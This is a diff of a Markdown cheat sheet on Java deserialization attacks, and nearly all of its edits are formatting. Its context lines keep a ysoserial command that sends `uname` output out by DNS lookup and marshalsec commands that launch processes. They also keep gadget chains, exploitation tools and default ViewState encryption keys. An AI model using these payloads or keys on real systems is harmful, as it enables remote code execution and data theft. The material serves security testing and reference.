@@ -2,28 +2,25 @@
 
 > Java serialization is the process of converting a Java object’s state into a byte stream, which can be stored or transmitted and later reconstructed (deserialized) back into the original object. Serialization in Java is primarily done using the `Serializable` interface, which marks a class as serializable, allowing it to be saved to files, sent over a network, or transferred between JVMs.
 
-
 ## Summary
 
 * [Detection](#detection)
 * [Tools](#tools)
     * [Ysoserial](#ysoserial)
-    * [Burp extensions using ysoserial](#burp-extensionsl)
+    * [Burp extensions using ysoserial](#burp-extensions)
     * [Alternative Tooling](#alternative-tooling)
 * [YAML Deserialization](#yaml-deserialization)
 * [ViewState](#viewstate)
 * [References](#references)
 
-
 ## Detection
 
-- `"AC ED 00 05"` in Hex
+* `"AC ED 00 05"` in Hex
     * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.
     * `00 05`: STREAM_VERSION. The serialization version.
-- `"rO0"` in Base64
-- `Content-Type` = "application/x-java-serialized-object"
-- `"H4sIAAAAAAAAAJ"` in gzip(base64)
-
+* `"rO0"` in Base64
+* `Content-Type` = "application/x-java-serialized-object"
+* `"H4sIAAAAAAAAAJ"` in gzip(base64)
 
 ## Tools
 
@@ -50,7 +47,7 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
 | CommonsBeanutils1   | @frohoff                               | commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 |
 | CommonsCollections1 | @frohoff                               | commons-collections:3.1 |
 | CommonsCollections2 | @frohoff                               | commons-collections4:4.0 |
-| CommonsCollections3 | @frohoff                               | commons-collections:3.1 | 
+| CommonsCollections3 | @frohoff                               | commons-collections:3.1 |
 | CommonsCollections4 | @frohoff                               | commons-collections4:4.0 |
 | CommonsCollections5 | @matthias_kaiser, @jasinner            | commons-collections:3.1  |
 | CommonsCollections6 | @matthias_kaiser                       | commons-collections:3.1  |
@@ -77,32 +74,33 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
 | Vaadin1             | @kai_ullrich                           | vaadin-server:7.7.14, vaadin-shared:7.7.14 |
 | Wicket1             | @jacob-baines                          | wicket-util:6.23.0, slf4j-api:1.6.4 |
 
-
 ### Burp extensions
 
-- [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) -  Burp extension to perform Java Deserialization Attacks 
-- [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) -  All-in-one plugin for Burp Suite for the detection and the exploitation of Java deserialization vulnerabilities 
-- [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  YSOSERIAL Integration with Burp Suite 
-- [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java Deserialization Vulnerability Identification
-- [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java Deserialization Vulnerability Active Identification Burp Extender
-
+* [NetSPI/JavaSerialKiller](https://github.com/NetSPI/JavaSerialKiller) -  Burp extension to perform Java Deserialization Attacks
+* [federicodotta/Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner) -  All-in-one plugin for Burp Suite for the detection and the exploitation of Java deserialization vulnerabilities
+* [summitt/burp-ysoserial](https://github.com/summitt/burp-ysoserial) -  YSOSERIAL Integration with Burp Suite
+* [DirectDefense/SuperSerial](https://github.com/DirectDefense/SuperSerial) - Burp Java Deserialization Vulnerability Identification
+* [DirectDefense/SuperSerial-Active](https://github.com/DirectDefense/SuperSerial-Active) - Java Deserialization Vulnerability Active Identification Burp Extender
 
 ### Alternative Tooling
 
-- [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Pure JRE 8 RCE Deserialization gadget
-- [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
-- [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - A fork of the original ysoserial application 
-- [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
-- [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
-- [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Exploiting Deserialization to Brute-Force the Remote Classpath
-- [k3idii/Deserek](https://github.com/k3idii/Deserek) - Python code to Serialize and Unserialize java binary serialization format. 
+* [pwntester/JRE8u20_RCE_Gadget](https://github.com/pwntester/JRE8u20_RCE_Gadget) - Pure JRE 8 RCE Deserialization gadget
+* [joaomatosf/JexBoss](https://github.com/joaomatosf/jexboss) - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
+* [pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified) - A fork of the original ysoserial application
+* [NickstaDB/SerialBrute](https://github.com/NickstaDB/SerialBrute) - Java serialization brute force attack tool
+* [NickstaDB/SerializationDumper](https://github.com/NickstaDB/SerializationDumper) - A tool to dump Java serialization streams in a more human readable form
+* [bishopfox/gadgetprobe](https://labs.bishopfox.com/gadgetprobe) - Exploiting Deserialization to Brute-Force the Remote Classpath
+* [k3idii/Deserek](https://github.com/k3idii/Deserek) - Python code to Serialize and Unserialize java binary serialization format.
+
   ```java
   java -jar ysoserial.jar URLDNS http://xx.yy > yss_base.bin
   python deserek.py yss_base.bin --format python > yss_url.py
   python yss_url.py yss_new.bin
   java -cp JavaSerializationTestSuite DeSerial yss_new.bin
   ```
-- [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Turning your data into code execution
+
+* [mbechler/marshalsec](https://github.com/mbechler/marshalsec) - Java Unmarshaller Security - Turning your data into code execution
+
   ```java
   $ java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]
   $ java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
@@ -132,8 +130,6 @@ Payload generators for the following marshallers are included:
 | XStream                         | **JDK only RCEs** |
 | YAMLBeans                       | third party RCE |
 
-
-
 ## YAML Deserialization
 
 SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language) data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used for configuration files and data exchange.
@@ -145,7 +141,6 @@ SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YA
   ]]
 ]
 ```
-
 
 ## ViewState
 
@@ -159,14 +154,12 @@ In Java, ViewState refers to the mechanism used by frameworks like JavaServer Fa
 * [joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) - JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool
 * [Synacktiv-contrib/inyourface](https://github.com/Synacktiv-contrib/inyourface) - InYourFace is a software used to patch unencrypted and unsigned JSF ViewStates.
 
-
 ### Encoding
 
 | Encoding      | Starts with |
 | ------------- | ----------- |
 | base64        | `rO0`       |
 | base64 + gzip | `H4sIAAA`   |
-
 
 ### Storage
 
@@ -176,7 +169,6 @@ The storage method can also be inferred from the viewstate representation in the
 
 * **Server side** storage: `value="-XXX:-XXXX"`
 * **Client side** storage: `base64 + gzip + Java Object`
-
 
 ### Encryption
 
@@ -206,23 +198,21 @@ Common secrets from the [documentation](https://cwiki.apache.org/confluence/disp
 | AES CBC              | `MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMTIz` |
 | AES CBC IV           | `NzY1NDMyMTA3NjU0MzIxMA==`         |
 
-
 * **Encryption**: Data -> encrypt -> hmac_sha1_sign -> b64_encode -> url_encode -> ViewState
 * **Decryption**: ViewState -> url_decode -> b64_decode -> hmac_sha1_unsign -> decrypt -> Data
 
-
 ## References
 
-- [Detecting deserialization bugs with DNS exfiltration - Philippe Arteau - March 22, 2017](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
-- [Hack The Box - Arkham - 0xRick - August 10, 2019](https://0xrick.github.io/hack-the-box/arkham/)
-- [How I found a $1500 worth Deserialization vulnerability - Ashish Kunwar - August 28, 2018](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
-- [Jackson CVE-2019-12384: anatomy of a vulnerability class - Andrea Brancaleoni - July 22, 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
-- [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://www.exploit-db.com/docs/48126)
-- [Java-Deserialization-Cheat-Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
-- [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
-- [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
-- [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
-- [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
-- [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
-- [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
-- [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
+* [Detecting deserialization bugs with DNS exfiltration - Philippe Arteau - March 22, 2017](https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/)
+* [Hack The Box - Arkham - 0xRick - August 10, 2019](https://0xrick.github.io/hack-the-box/arkham/)
+* [How I found a $1500 worth Deserialization vulnerability - Ashish Kunwar - August 28, 2018](https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a)
+* [Jackson CVE-2019-12384: anatomy of a vulnerability class - Andrea Brancaleoni - July 22, 2019](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
+* [Java Deserialization in ViewState - Haboob Team - December 23, 2020](https://www.exploit-db.com/docs/48126)
+* [Java-Deserialization-Cheat-Sheet - Aleksei Tiurin - May 23, 2023](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md)
+* [JSF ViewState upside-down - Renaud Dubourguais, Nicolas Collignon - March 15, 2016](https://www.synacktiv.com/ressources/JSF_ViewState_InYourFace.pdf)
+* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
+* [Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - Peter Stöckli - August 14, 2017](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
+* [On Jackson CVEs: Don’t Panic — Here is what you need to know - cowtowncoder - December 22, 2017](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
+* [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin (@artsploit) - June 29, 2021](https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464)
+* [Triggering a DNS lookup using Java Deserialization - paranoidsoftware.com - July 5, 2020](https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/)
+* [Understanding & practicing java deserialization exploits - Diablohorn - September 9, 2017](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)
